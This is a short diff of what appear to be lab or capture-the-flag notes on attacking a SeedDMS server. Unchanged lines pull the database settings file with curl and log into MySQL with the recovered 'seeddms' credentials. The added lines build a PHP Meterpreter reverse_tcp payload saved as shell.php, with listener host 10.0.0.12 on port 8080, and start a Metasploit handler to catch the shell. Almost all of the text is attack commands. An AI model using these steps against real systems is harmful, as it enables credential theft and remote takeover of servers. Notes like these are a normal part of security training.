@@ -15,3 +15,14 @@ curl http://192.168.87.104/seeddms51x/conf/settings.xml -sL | grep -i db
 
 Logging into the mysql database:
 mysql -u seeddms -pseeddms -D seeddms --silent -h 10.0.0.220
+
+Using Metasploit to create a reverse shell:
+use payload/php/meterpreter/reverse_tcp
+set lhost 10.0.0.12
+set lport 8080
+generate -f raw -so shell.php
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 10.0.0.12
+set lport 8080
+run
